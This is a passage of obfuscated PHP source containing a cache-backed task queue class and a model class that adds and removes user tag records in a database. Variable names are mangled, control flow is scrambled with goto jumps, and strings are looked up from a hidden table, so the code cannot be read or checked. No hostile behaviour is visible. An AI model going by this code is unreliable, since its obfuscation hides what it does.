self::MAX_LENGTH) { return !1; } $Bâß…¦ß÷ = self::getAll(); goto c‡É¤®µß; cØë¹ÖêÜ’: } public static function run() { goto b±í‹ÚóÙ; e’¤è—±: if (!$eÁçÀ±«Ç¢) { return !1; } self::setAll($e¢êèñ§); $A¼”¾ ÑÛÍ = timeFloat(); goto Cœ®Œ¡·Â¦; Cœ®Œ¡·Â¦: try { Hook::apply($eÁçÀ±«Ç¢[$fàƒà¢ìÃÄ[261]], $eÁçÀ±«Ç¢[$fàƒà¢ìÃÄ[1583]]); } catch (Exception $BÑŒî††¿º) { } $b–ö¸¥Õä· = number_format(timeFloat() - $A¼”¾ ÑÛÍ, 3) . $fàƒà¢ìÃÄ[1527]; write_log($fàƒà¢ìÃÄ[1586] . $eÁçÀ±«Ç¢[$fàƒà¢ìÃÄ[438]] . $fàƒà¢ìÃÄ[1587] . $b–ö¸¥Õä·, $fàƒà¢ìÃÄ[1585]); goto F¶ï¨°…; b±í‹ÚóÙ: $fàƒà¢ìÃÄ =& $_SERVER[Šº]; $e¢êèñ§ = self::getAll(); $eÁçÀ±«Ç¢ = array_shift($e¢êèñ§); goto e’¤è—±; F¶ï¨°…: return !0; goto Añ™Åï´Ï; Añ™Åï´Ï: } public static function count() { $Fí§ÉÒÓâò = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Fí§ÉÒÓâò) { return 0; } return intval($Fí§ÉÒÓâò); } public static function getAll() { $bàº¤äç¿ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$bàº¤äç¿) { return array(); } return $bàº¤äç¿; } public static function setAll($F›²”¯¹…µ) { $eŒœò¿šà = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($F›²”¯¹…µ), $eŒœò¿šà); Cache::set(self::QUEUE_DATA, $F›²”¯¹…µ, $eŒœò¿šà); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto cÉŠÇÊ˜öÆ; DĞ´ÅùËÂ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($e¿Ğ‹Ã»¹) { $DØòéšé·Ø =& $_SERVER[Šº]; return array($DØòéšé·Ø[1779] => array(USER_ID, $DØòéšé·Ø[1780])); } protected function listData() { $b˜³óŞ•Õ =& $_SERVER[Šº]; $E¶Œ¸áîˆ = array($b˜³óŞ•Õ[1506] => USER_ID, $b˜³óŞ•Õ[470] => array($b˜³óŞ•Õ[1783], 0)); $fÛ­§ÌÔ¶ = $b˜³óŞ•Õ[1785]; $b³œŒˆá–¤ = $this->field($fÛ­§ÌÔ¶)->where($E¶Œ¸áîˆ)->order($b˜³óŞ•Õ[1786])->select(); return $b³œŒˆá–¤ ? $b³œŒˆá–¤ : array(); } protected function listByTag($E„…¿Ó¢Å) { } protected function addToTag($aìÕº¨á¨, $dÆô¹ôµï) { $DåÈÇĞ‡·¯ =& $_SERVER[Šº]; if (!Model($DåÈÇĞ‡·¯[1921])->listData($dÆô¹ôµï) || !Model($DåÈÇĞ‡·¯[788])->pathInfo($aìÕº¨á¨)) { return !1; } $AƒÇ±ç¬†³ = array($DåÈÇĞ‡·¯[1506] => USER_ID, $DåÈÇĞ‡·¯[470] => $dÆô¹ôµï, $DåÈÇĞ‡·¯[421] => $aìÕº¨á¨, $DåÈÇĞ‡·¯[422] => $DåÈÇĞ‡·¯[416], $DåÈÇĞ‡·¯[420] => $DåÈÇĞ‡·¯[33], $DåÈÇĞ‡·¯[1681] => 0); if ($this->where($AƒÇ±ç¬†³)->find()) { return !1; } return $this->add($AƒÇ±ç¬†³); } protected function removeFromTag($Eå º¿Œù, $E·×Ö—Ì³±) { $Bù¥¯“¿äî =& $_SERVER[Šº]; if (!Model($Bù¥¯“¿äî[1921])->listData($E·×Ö—Ì³±)) { return !1; } if (is_array($Eå º¿Œù)) { $Eå º¿Œù = array($Bù¥¯“¿äî[7], $Eå º¿Œù); } $C˜¯Ôï‰¿¢ = array($Bù¥¯“¿äî[1506] => USER_ID, $Bù¥¯“¿äî[470] => $E·×Ö—Ì³±, $Bù¥¯“¿äî[422] => $Bù¥¯“¿äî[416], $Bù¥¯“¿äî[421] => $Eå º¿Œù); return $this->where($C˜¯Ôï‰¿¢)->delete(); } protected function removeByTag($döµğøÁ®¥) { $e¨Í²”é¶‹ =& $_SERVER[Šº]; if (!$döµğøÁ®¥) { return !1; } $B²ã†×ùãÀ = array($e¨Í²”é¶‹[1506] => USER_ID, $e¨Í²”é¶‹[470] => $döµğøÁ®¥); return $this->where($B²ã†×ùãÀ)->delete(); } protected function removeBySource($f®Á÷˜æ‹—) { $E¸ç‡Šñƒø =& $_SERVER[Šº]; if (is_array($f®Á÷˜æ‹—)) { $f®Á÷˜æ‹— = array($E¸ç‡Šñƒø[7], $f®Á÷˜æ‹—); } $CÌÃŒíŒŠƒ = array($E¸ç‡Šñƒø[1506] => USER_ID, $E¸ç‡Šñƒø[421] => $f®Á÷˜æ‹—, $E¸ç‡Šñƒø[470] => array($E¸ç‡Šñƒø[959], 0)); return $this->where($CÌÃŒíŒŠƒ)->delete(); } }